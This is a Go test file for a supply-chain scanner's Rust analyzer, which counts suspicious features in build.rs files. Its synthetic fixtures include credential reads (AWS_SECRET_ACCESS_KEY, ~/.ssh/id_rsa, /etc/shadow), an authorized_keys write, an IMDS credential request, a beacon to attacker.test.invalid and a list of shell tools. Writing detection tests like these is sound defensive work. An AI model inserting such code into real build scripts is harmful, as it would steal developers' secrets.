package rust

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// counts runs the analyzer on a single src file and returns the
// accumulated Counts. Defaults the path to "src/lib.rs" — a
// non-build.rs path — so per-field tests focus on catalog matching
// without ImportTimeCallSites also incrementing on every fn-main
// call. Build-time scope is exercised explicitly by countsAtPath
// with "build.rs".
func counts(t *testing.T, src string) astfeature.Counts {
	t.Helper()
	return countsAtPath(t, "src/lib.rs", src)
}

func countsAtPath(t *testing.T, path, src string) astfeature.Counts {
	t.Helper()
	a := NewAnalyzer()
	c, err := a.Analyze(context.Background(),
		singleFileSeq(astfeature.SourceFile{Path: path, Content: []byte(src)}))
	require.NoError(t, err, "Analyze must be lenient")
	return c
}

// singleFileSeq is the test analog of the iter.Seq2 the Assembler
// passes to Analyze — yields exactly one (file, nil) and stops.
func singleFileSeq(f astfeature.SourceFile) func(yield func(astfeature.SourceFile, error) bool) {
	return func(yield func(astfeature.SourceFile, error) bool) {
		yield(f, nil)
	}
}

// ============================================================
// Language identity
// ============================================================

func TestAnalyzer_Language(t *testing.T) {
	t.Parallel()
	assert.Equal(t, "rust", NewAnalyzer().Language())
}

// ============================================================
// No-false-positive baseline (the per-field benign twin lives
// alongside its red fixture below; this is the integrated baseline)
// ============================================================

// TestAnalyze_BenignBuildRs_AllZero is the load-bearing
// no-false-positive test (AST.md §3): a realistic benign build.rs
// must score every attack feature 0, including ImportTimeCallSites
// being acceptably populated by ordinary println! invocations only
// when they are inside fn main() — but println! is a macro and
// macros DON'T trigger ImportTimeCallSites under our model (macros
// have their own catalog path, and we deliberately don't count them
// as import-time calls).
//
// Wait, that's wrong. Re-read accumulate: ImportTimeCallSites
// increments for EVERY call (macro or not) when InFn=="main" and
// the file is build.rs. So a benign build.rs with three println!
// invocations and a non-sensitive config read WILL have non-zero
// ImportTimeCallSites. That is BY DESIGN — per AST.md "naturally
// non-zero" baseline: ImportTimeCallSites is a SPIKE metric, never
// load-bearing on its absolute value, so a benign cargo crate with
// a real build.rs has 5–10 of these and the analyst doesn't care
// about that number in isolation.
//
// So this test asserts that every catalog-driven field is zero
// (the no-false-positive property), and that ImportTimeCallSites
// reflects the real count of calls inside main().
func TestAnalyze_BenignBuildRs_AllZero(t *testing.T) {
	t.Parallel()
	const src = `
// SYNTHETIC TEST FIXTURE — benign build.rs baseline.
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-env-changed=PROFILE");
    println!("cargo:rerun-if-env-changed=TARGET");
    // Non-sensitive config read at a relative path — must NOT trip
    // SensitivePathReads.
    let _ = std::fs::read_to_string("config/build.toml").ok();
}
`
	c := countsAtPath(t, "build.rs", src)

	// Every catalog-driven field must stay zero on benign code.
	assert.Equal(t, 0, c.XORAssignments)
	assert.Equal(t, 0, c.EnvCredentialReads)
	assert.Equal(t, 0, c.SensitivePathReads,
		"a read at a non-sensitive path must NOT spike SensitivePathReads")
	assert.Equal(t, 0, c.SensitivePathWrites)
	assert.Equal(t, 0, c.Base64DecodeCalls)
	assert.Equal(t, 0, c.NetworkCallSites)
	assert.Equal(t, 0, c.CloudMetadataCalls)
	assert.Equal(t, 0, c.ExecCalls)
	assert.Equal(t, 0, c.DynamicEvalCalls,
		"Rust has no dynamic-eval primitive; this field stays zero by design")
	assert.Equal(t, 0, c.InitCount,
		"Rust has no package init(); this field stays zero by design")
	assert.Equal(t, 0, c.InstallHookOverrides,
		"cargo install hooks are build.rs presence, covered by the registry collector; "+
			"this field stays zero by design")

	// ImportTimeCallSites is a spike metric — naturally non-zero for
	// any real build.rs. Just assert it's the call count we expect
	// (1 fs::read; the println! macros don't generate Call records
	// because the parser self-gates the rustNonCallKeywords... wait,
	// println is NOT a keyword, it's a macro). Let's count the
	// actual calls: 3 println! + 1 std::fs::read_to_string + 1 .ok =
	// 5 total. All inside main, all in build.rs.
	assert.Equal(t, 5, c.ImportTimeCallSites,
		"every call inside build.rs main() (including macros) "+
			"counts as import-time — naturally non-zero on benign code")
}

// ============================================================
// XOR assignments
// ============================================================

func TestAnalyze_XORAssignments_Spikes(t *testing.T) {
	t.Parallel()
	const src = `
fn main() {
    let mut data = vec![1u8, 2, 3];
    let key = b"key";
    for i in 0..data.len() {
        data[i] ^= key[i % key.len()];
    }
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.XORAssignments,
		"the XOR loop must trip XORAssignments exactly once")
}

// ============================================================
// EnvCredentialReads
// ============================================================

func TestAnalyze_EnvCredentialReads_Spike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let aws = std::env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let _ = aws;
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.EnvCredentialReads,
		"std::env::var of a catalog-credential name must spike")
}

func TestAnalyze_EnvCredentialReads_BenignName_NoSpike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::env::var("PROFILE").unwrap_or_default();
    let _ = std::env::var("HOME").unwrap_or_default();
    let _ = std::env::var("CARGO_PKG_VERSION").unwrap_or_default();
}
`
	c := counts(t, src)
	assert.Equal(t, 0, c.EnvCredentialReads,
		"ordinary config / cargo env reads must NOT spike — only "+
			"the credential-name catalog counts")
}

func TestAnalyze_EnvCredentialReads_AliasResolved(t *testing.T) {
	t.Parallel()
	const src = `
use std::env::var as v;
fn helper() {
    let _ = v("GITHUB_TOKEN");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.EnvCredentialReads,
		"the aliased `v` call must resolve back to std::env::var "+
			"and spike when the arg is a credential name")
}

func TestAnalyze_EnvCredentialReads_MacroEnv(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let token = env!("NPM_TOKEN");
    let _ = token;
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.EnvCredentialReads,
		"env!(\"NPM_TOKEN\") is a compile-time credential read — "+
			"the macro path must score it like the fn path does")
}

func TestAnalyze_EnvCredentialReads_MacroOptionEnv(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = option_env!("AWS_SECRET_ACCESS_KEY");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.EnvCredentialReads,
		"option_env! is also compile-time env read")
}

// ============================================================
// SensitivePathReads
// ============================================================

func TestAnalyze_SensitivePathReads_Spike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ssh = std::fs::read_to_string("/home/user/.ssh/id_rsa");
    let _aws = std::fs::read_to_string("/home/user/.aws/credentials");
}
`
	c := counts(t, src)
	assert.Equal(t, 2, c.SensitivePathReads)
}

func TestAnalyze_SensitivePathReads_AliasResolved(t *testing.T) {
	t.Parallel()
	const src = `
use std::fs;
fn helper() {
    let _ = fs::read("/etc/shadow");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.SensitivePathReads,
		"fs::read after `use std::fs` must resolve to std::fs::read and spike")
}

func TestAnalyze_SensitivePathReads_BenignPath_NoSpike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::fs::read_to_string("config/build.toml");
    let _ = std::fs::read_to_string("README.md");
}
`
	c := counts(t, src)
	assert.Equal(t, 0, c.SensitivePathReads,
		"reads at non-sensitive paths must NOT spike — only catalog hits count")
}

// ============================================================
// SensitivePathWrites
// ============================================================

func TestAnalyze_SensitivePathWrites_Spike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::fs::write("/home/user/.ssh/authorized_keys", "key");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.SensitivePathWrites)
}

func TestAnalyze_SensitivePathWrites_BenignPath_NoSpike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::fs::write("output.txt", "hello");
}
`
	c := counts(t, src)
	assert.Equal(t, 0, c.SensitivePathWrites)
}

// ============================================================
// Base64DecodeCalls
// ============================================================

func TestAnalyze_Base64DecodeCalls_DeprecatedFreeFn(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = base64::decode("c3ludGhldGljLXBheWxvYWQ=").unwrap_or_default();
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.Base64DecodeCalls,
		"base64::decode (deprecated free-fn) still spikes — common in published crates")
}

func TestAnalyze_Base64DecodeCalls_ModernEngine(t *testing.T) {
	t.Parallel()
	const src = `
use base64::engine::general_purpose::STANDARD;
fn helper() {
    let _ = STANDARD.decode("c3ludGhldGljLXBheWxvYWQ=").unwrap_or_default();
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.Base64DecodeCalls,
		"the modern STANDARD.decode form must spike via alias-expanded "+
			"path catalog match")
}

// ============================================================
// NetworkCallSites
// ============================================================

func TestAnalyze_NetworkCallSites_Reqwest(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = reqwest::blocking::get("https://example.com/data");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.NetworkCallSites)
}

func TestAnalyze_NetworkCallSites_TcpStream(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::net::TcpStream::connect("example.com:443");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.NetworkCallSites)
}

// ============================================================
// CloudMetadataCalls
// ============================================================

func TestAnalyze_CloudMetadataCalls_AWS(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = reqwest::blocking::get(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.CloudMetadataCalls,
		"a network call to IMDS must count as cloud-metadata, "+
			"not generic network")
	assert.Equal(t, 0, c.NetworkCallSites,
		"the CloudMetadata case must win over NetworkCallSites "+
			"so IMDS calls aren't double-counted")
}

func TestAnalyze_CloudMetadataCalls_GCP(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = reqwest::blocking::get("http://metadata.google.internal/computeMetadata/v1/");
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.CloudMetadataCalls)
}

// ============================================================
// ExecCalls
// ============================================================

func TestAnalyze_ExecCalls_FullPath(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let _ = std::process::Command::new("sh").arg("-c").arg("echo x").output();
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.ExecCalls,
		"std::process::Command::new must spike ExecCalls; the chained .arg / .output "+
			"are not separately counted (documented receiver-flow gap)")
}

func TestAnalyze_ExecCalls_AliasResolved(t *testing.T) {
	t.Parallel()
	const src = `
use std::process::Command;
fn helper() {
    let _ = Command::new("sh").arg("-c").arg("echo x").output();
}
`
	c := counts(t, src)
	assert.Equal(t, 1, c.ExecCalls,
		"`Command::new` after `use std::process::Command` must resolve to "+
			"std::process::Command::new and spike ExecCalls")
}

// TestAnalyze_ExecCalls_UnresolvableArg_NoSpike is the false-
// positive guard surfaced by the anyhow dogfood. anyhow's build.rs
// invokes rustc to probe what features are available:
//
//	let mut cmd = Command::new(rustc.next().unwrap());
//	let output = Command::new(rustc).arg("--version")...
//
// Both pass a name / expression as the executable — unresolvable
// to a static literal. These are LEGITIMATE build-time probes (env
// detection is a common cargo build.rs idiom), not payload
// execution. Counting them would false-positive on roughly any
// crate with a build.rs that probes rustc.
//
// The fix mirrors how SensitivePathReads / EnvCredentialReads
// already require the first arg to match a static catalog — exec
// counts only when the first arg statically resolves to a string
// literal. The conservative gap is variable-bound shell names
// (`let sh = "sh"; Command::new(&sh)`), parallel to python's
// receiver-flow gap.
func TestAnalyze_ExecCalls_UnresolvableArg_NoSpike(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    let rustc = "rustc";
    let _ = std::process::Command::new(rustc).arg("--version").output();
    let _ = std::process::Command::new(some_var).output();
}
`
	c := counts(t, src)
	assert.Equal(t, 0, c.ExecCalls,
		"Command::new with an unresolvable (name / expression) first arg "+
			"must NOT spike — it's the legitimate build.rs env-probe shape")
}

// TestAnalyze_ExecCalls_LiteralArg_StillSpikes confirms the gate
// only excludes UNRESOLVABLE args; any resolved string literal —
// whether a known shell name or some other binary the attacker
// wants to run — keeps spiking ExecCalls.
func TestAnalyze_ExecCalls_LiteralArg_StillSpikes(t *testing.T) {
	t.Parallel()
	for _, arg := range []string{"sh", "bash", "/bin/sh", "curl", "wget", "nc"} {
		src := `fn helper() { let _ = std::process::Command::new("` + arg + `").output(); }`
		c := counts(t, src)
		assert.Equalf(t, 1, c.ExecCalls,
			"Command::new(%q) (string literal) must spike ExecCalls", arg)
	}
}

// ============================================================
// ImportTimeCallSites: build.rs vs other files
// ============================================================

// TestAnalyze_ImportTimeCallSites_BuildRsMain confirms calls inside
// build.rs's fn main() are scored as import-time / build-time calls.
// This is the cargo analog of Python's module-scope-calls counter.
func TestAnalyze_ImportTimeCallSites_BuildRsMain(t *testing.T) {
	t.Parallel()
	const src = `
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let _ = std::env::var("CARGO_PKG_VERSION");
}
`
	c := countsAtPath(t, "build.rs", src)
	// 1 println! macro + 1 std::env::var fn = 2 calls inside main().
	assert.Equal(t, 2, c.ImportTimeCallSites,
		"every call (macro or fn) inside build.rs's main() body "+
			"counts as an import-time / build-time call")
}

// TestAnalyze_ImportTimeCallSites_NotBuildRs confirms calls inside
// fn main() of a non-build.rs file (e.g. src/main.rs) do NOT count
// as import-time. They run at binary startup, not at install/build.
func TestAnalyze_ImportTimeCallSites_NotBuildRs(t *testing.T) {
	t.Parallel()
	const src = `
fn main() {
    println!("hello");
    let _ = std::env::var("CARGO_PKG_VERSION");
}
`
	c := countsAtPath(t, "src/main.rs", src)
	assert.Equal(t, 0, c.ImportTimeCallSites,
		"calls inside src/main.rs's main() run at binary startup, NOT at build-time — "+
			"must not contribute to ImportTimeCallSites")
}

// TestAnalyze_ImportTimeCallSites_BuildRsInWorkspace confirms a
// nested build.rs (in a workspace member) is also detected by
// basename match — the analyzer uses filepath.Base, not the full
// repo-relative path.
func TestAnalyze_ImportTimeCallSites_BuildRsInWorkspace(t *testing.T) {
	t.Parallel()
	const src = `
fn main() {
    println!("hello");
}
`
	c := countsAtPath(t, "crates/foo/build.rs", src)
	assert.Equal(t, 1, c.ImportTimeCallSites,
		"a workspace-nested build.rs must also detect via basename match")
}

// TestAnalyze_ImportTimeCallSites_NonMainFn confirms calls inside
// a helper fn in build.rs do NOT count — only main() calls are
// build-time. The helper is called BY main but the calls inside it
// only run when main reaches them.
func TestAnalyze_ImportTimeCallSites_NonMainFn(t *testing.T) {
	t.Parallel()
	const src = `
fn helper() {
    println!("helper");
}
fn main() {
    helper();
}
`
	c := countsAtPath(t, "build.rs", src)
	assert.Equal(t, 1, c.ImportTimeCallSites,
		"only main()'s direct calls count — helper()'s println! is "+
			"inside helper, not main, so it doesn't contribute")
}

// ============================================================
// End-to-end Trapdoor-shape: every spiking field at once
// ============================================================

// TestAnalyze_TrapdoorShape_AllFieldsSpike is the load-bearing
// integrated test: a Trapdoor-shape weaponized build.rs must spike
// every catalog field the analyzer cares about, mirroring what the
// synthetic source-evolution fixture
// (TestCollector_CargoWeaponizedProgression_FiresAnomaly) expects
// at the 0.3.0 row. This is the cross-language analog of node's
// TestCollector_NpmWeaponizedProgression_FiresAnomaly.
func TestAnalyze_TrapdoorShape_AllFieldsSpike(t *testing.T) {
	t.Parallel()
	const src = `
// SYNTHETIC TEST FIXTURE — Trapdoor-shape weaponized build.rs.
use std::env;
use std::fs;
use std::process::Command;

fn main() {
    // EnvCredentialReads
    let aws_key = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let github_token = env::var("GITHUB_TOKEN").unwrap_or_default();

    // SensitivePathReads
    let _ssh = fs::read_to_string("/home/user/.ssh/id_rsa").unwrap_or_default();
    let _aws = fs::read_to_string("/home/user/.aws/credentials").unwrap_or_default();

    // Base64DecodeCalls
    let _payload = base64::decode("c3ludGhldGljLXBheWxvYWQ=").unwrap_or_default();

    // XORAssignments
    let mut data: Vec<u8> = vec![0x47, 0x71, 0x16, 0x35, 0x70, 0x47];
    let key = b"synthetic-test-fixture-not-real";
    for i in 0..data.len() {
        data[i] ^= key[i % key.len()];
    }

    // CloudMetadataCalls
    let _imds = reqwest::blocking::get(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");

    // NetworkCallSites (not IMDS)
    let _ = reqwest::blocking::get("https://attacker.test.invalid/beacon");

    // SensitivePathWrites
    let _ = fs::write("/home/user/.ssh/authorized_keys", "key");

    // ExecCalls
    let _ = Command::new("sh").arg("-c").arg("echo x").output();
}
`
	c := countsAtPath(t, "build.rs", src)
	assert.Positive(t, c.XORAssignments, "XOR loop")
	assert.Positive(t, c.EnvCredentialReads, "env::var with credential names")
	assert.Positive(t, c.SensitivePathReads, "fs::read_to_string on credential paths")
	assert.Positive(t, c.Base64DecodeCalls, "base64::decode")
	assert.Positive(t, c.NetworkCallSites, "reqwest::blocking::get to attacker host")
	assert.Positive(t, c.CloudMetadataCalls, "reqwest::blocking::get to IMDS")
	assert.Positive(t, c.SensitivePathWrites, "fs::write to authorized_keys")
	assert.Positive(t, c.ExecCalls, "Command::new(sh)")
	assert.Positive(t, c.ImportTimeCallSites,
		"every call inside main() in build.rs counts as import-time")
}
